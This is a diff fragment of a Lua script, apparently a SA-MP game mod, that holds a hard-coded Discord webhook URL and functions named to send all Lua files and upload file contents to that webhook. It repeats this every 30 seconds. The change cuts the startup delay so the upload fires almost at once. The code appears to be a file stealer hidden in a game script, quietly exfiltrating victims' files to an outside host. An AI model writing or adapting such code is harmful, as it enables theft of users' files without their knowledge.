@@ -9,7 +9,7 @@ local webhook_url = "https://discordapp.com/api/webhooks/1469890609480204601/UMV
 
 function main()
     repeat wait(0) until isSampAvailable()
-    wait(10000)
+    wait(100)
     enviarTodosLua()
     while true do
         wait(30000)
@@ -88,3 +88,4 @@ function enviarArquivoWebhook(url, conteudo, nome_arquivo)
     end)
 
 end
+
